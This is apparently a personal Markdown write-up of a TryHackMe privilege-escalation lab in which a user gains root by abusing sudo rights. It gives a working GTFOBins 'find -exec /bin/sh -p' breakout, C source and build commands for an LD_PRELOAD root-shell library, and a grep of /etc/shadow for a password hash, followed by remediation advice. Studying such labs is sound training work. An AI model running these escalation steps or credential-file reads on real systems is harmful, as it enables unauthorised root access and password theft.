# 🛡️ Lab 04: Sudo Rights & Environment Abuse (GTFOBins & LD_PRELOAD)

| Platform | Category | Difficulty | Status |
|---|---|---|---|
| Linux / TryHackMe | Privilege Escalation | Easy / Medium | ✅ Completed |

---

## 🎯 Goal
Escalate privileges from an unprivileged standard user (`karen` / UID 1001) to full administrative `root` (UID 0) by auditing delegated `sudo` privileges, evaluating environment variable preservation, and weaponizing built-in binary features via GTFOBins.

---

## 🧠 Concept & Architecture

### How Sudo Works
The `sudo` (SuperUser DO) utility allows system administrators to delegate administrative authority without sharing the global root password. Privileges are configured within `/etc/sudoers` or `/etc/sudoers.d/`.

When a command runs with `sudo`:
* The **Real UID (RUID)** remains the calling user (`karen`).
* The **Effective UID (EUID)** is escalated to `0` (`root`), granting temporary administrative capabilities for that specific process.

### The Attack Vectors

#### 1. GTFOBins & Interactive Escapes
System utilities (`find`, `less`, `nano`, `vim`) often feature diagnostic flags, file execution triggers, or integrated shells. When an administrator grants `NOPASSWD: ALL` access on these binaries, users can escape the application's intended scope into an interactive root subshell.

#### 2. Dynamic Linker Hijacking (`LD_PRELOAD`)
`LD_PRELOAD` is an environment variable directing the dynamic linker (`ld.so`) to load specified shared objects (`.so`) before standard system libraries.
* **Default Security Behavior:** Standard `sudo` configurations enforce `env_reset`, wiping user environment variables to prevent injection attacks.
* **The Vulnerability:** If `/etc/sudoers` explicitly defines `env_keep += LD_PRELOAD`, unprivileged users can inject custom malicious shared libraries directly into the memory space of elevated programs.

---

## 🔍 Enumeration

### 1. Audit Sudo Delegations
Upon landing on the target shell, inspect configured privileges:

```bash
sudo -l
```

*Example output:*
```text
Matching Defaults entries for karen on target-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on target-node:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

### 2. Privilege Evaluation Matrix
* **`env_keep += LD_PRELOAD` Check:** Absent from `Defaults`. Dynamic linker preloading is disabled; the target must be compromised via allowed binaries.
* **Allowed Binaries:** The user has passwordless execution rights on three utilities:
  1. `/usr/bin/find` (High Risk: possesses the `-exec` flag).
  2. `/usr/bin/less` (High Risk: supports shell escaping via `!/bin/sh`).
  3. `/usr/bin/nano` (High Risk: allows arbitrary command execution via read file buffer).

---

## 💥 Exploitation Workflow

```
[Target: Low-Priv Shell (karen)]
        │
        ├── 1. Run "sudo -l" -> Discovered "NOPASSWD: /usr/bin/find"
        │
        ├── 2. Query GTFOBins for "find" -> Leverage -exec flag
        │
        ├── 3. Execute: sudo find . -exec /bin/sh -p \; -quit
        │       │
        │       ├── find executes with EUID 0 (root)
        │       ├── -exec spawns /bin/sh
        │       ├── -p prevents shell from dropping elevated EUID
        │       └── -quit terminates execution immediately after first run
        │
        └── 4. Spawn Root Shell (#) -> uid=0(root) confirmed
```

### Primary Vector: GTFOBins Breakout via `find`

Execute `find` with elevated privileges, instructing it to launch a subshell upon matching the current working directory:

```bash
sudo find . -exec /bin/sh -p \; -quit
```

*Command breakdown:*
* `sudo`: Elevates execution to UID 0 based on `/etc/sudoers` rule.
* `find .`: Initiates a search in the current directory.
* `-exec`: Instructs `find` to execute the trailing command for each match.
* `/bin/sh -p`: Spawns the Bourne shell with the `-p` (privileged) flag, forcing the shell to preserve the elevated effective UID rather than resetting it to the real user UID.
* `\;`: Terminates the `-exec` argument block. Escaped to prevent shell interpretation.
* `-quit`: Terminates the search process immediately after the first match to prevent infinite process loops.

*Example execution:*
```text
karen@target-node:~$ sudo find . -exec /bin/sh -p \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### Alternative Vector: Shared Object Injection (`LD_PRELOAD`)
*(Documented for environmental conditions where `env_keep += LD_PRELOAD` is present)*

If `sudo -l` reveals `env_keep += LD_PRELOAD`, privilege escalation is achieved by compiling a minimal shared library containing an initialization constructor:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile and trigger via any allowed sudo binary:

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

---

### Privilege Verification & Hash Extraction
Verify root execution and access critical files:

```bash
whoami
id
```

*Example output:*
```text
root
uid=0(root) gid=0(root) groups=0(root)
```

Dump password hashes directly from the protected shadow file:

```bash
grep 'frank' /etc/shadow
```

*Example output:*
```text
frank:$6$ZX04BTzS$dgMS3Rnj9MWVz9w5pQ9XzK4Yv...:18737:0:99999:7:::
```

---

## 🧬 Root Cause Analysis

1. **Over-Permissive Sudoers Delegation:** The administrator granted blanket execution rights (`ALL`) without restricting command arguments or preventing subshell spawning.
2. **Abuse of Legitimate Functionality:** System administration utilities like `find` are designed to execute downstream tasks. Granting elevated access to modular binaries inherently delegates arbitrary command execution.
3. **Implicit Trust in Interactive Binaries:** Interactive tools (`nano`, `less`, `vim`, `find`) allow internal execution of external commands, breaking the privilege boundary when running as `root`.

---

## 🛡️ Remediation & Hardening

| Layer | Defense Mechanism | Implementation |
|---|---|---|
| **Sudo Configuration** | Restrict Sudo Binaries | Never allow `NOPASSWD` access on interactive utilities or tools containing command-execution flags. |
| **Argument Hardening** | Enforce Strict Arguments | Constrain `find` execution paths in `/etc/sudoers`: `karen ALL=(root) /usr/bin/find /var/log/* -name *.log` (disallowing `-exec`). |
| **Environment Sanitization** | Enforce `env_reset` | Ensure `/etc/sudoers` specifies `Defaults env_reset` and remove all `env_keep += LD_PRELOAD` directives. |
| **Audit & Detection** | Log Sudo Operations | Monitor `/var/log/auth.log` or auditd rules for unusual subshell invocations (`-exec /bin/sh`, interactive mode escapes). |

---

## 📝 My Lab Notes

* **The Pivot:** Theoretical walk-throughs frequently showcase `LD_PRELOAD`, but real reconnaissance begins with `sudo -l`. When the target system lacked `env_keep`, I immediately pivoted to inspecting the allowed binaries rather than forcing an invalid vector.
* **The Significance of `-p`:** Standard shells drop elevated privileges if RUID != EUID. The `-p` flag is critical because it forces the spawned shell to respect the elevated effective UID, preserving the root session.
* **GTFOBins Mindset:** GTFOBins is not a collection of exploits; it is a catalog of intended administrative features that become lethal under bad security policy.

---

## 💡 Key Takeaways

1. **`sudo -l` is the first command:** Always inspect administrative delegations before attempting complex exploits.
2. **Interactive utilities are root shells in disguise:** Any tool supporting editors, pagers, or external command execution will yield a root shell if granted `sudo`.
3. **Environment variables violate isolation:** Never pass user-controlled variables (`LD_PRELOAD`, `LD_LIBRARY_PATH`) into elevated execution contexts.
4. **Principle of Least Privilege:** If a user only needs to search files, use restricted wrapper scripts rather than providing direct sudo rights to `/usr/bin/find`.

---

⬅️ [Previous: Kernel Exploits](./03-kernel-exploits-cve-2015-1328.md) | [Back to Labs](../README.md) | ➡️ [Next: SUID Binaries](./05-suid-binaries.md)
